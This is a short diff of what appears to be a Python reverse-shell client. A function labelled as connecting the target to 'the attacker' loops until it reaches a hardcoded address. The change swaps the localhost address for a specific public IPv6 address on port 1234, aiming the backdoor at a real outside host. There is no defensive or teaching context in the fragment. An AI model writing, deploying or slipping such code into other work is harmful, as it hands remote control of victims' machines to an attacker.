@@ -8,7 +8,7 @@ target_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connects with the attacker 
 def target_client_connector():
     # connect to the attacker
-    attacker_hostname = "127.0.0.1"
+    attacker_hostname = "2409:4063:2291:13d1:c421:695c:7d00:5173"
     attacker_port = 1234
     while(True):
         success = target_client.connect_ex((attacker_hostname, attacker_port))
